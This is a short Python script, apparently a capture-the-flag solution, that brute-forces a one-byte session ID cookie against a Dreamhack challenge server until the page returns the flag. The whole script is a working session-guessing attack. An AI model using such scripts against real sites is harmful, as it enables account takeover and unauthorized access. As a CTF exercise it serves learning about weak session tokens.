import requests
import os

URL = "http://host1.dreamhack.games:20839/"

while True:
    c = os.urandom(1).hex()
    cookies = {'sessionid' : c}
    res=requests.get(URL, cookies=cookies)
    if 'flag' in res.text:
        print (c)
        break
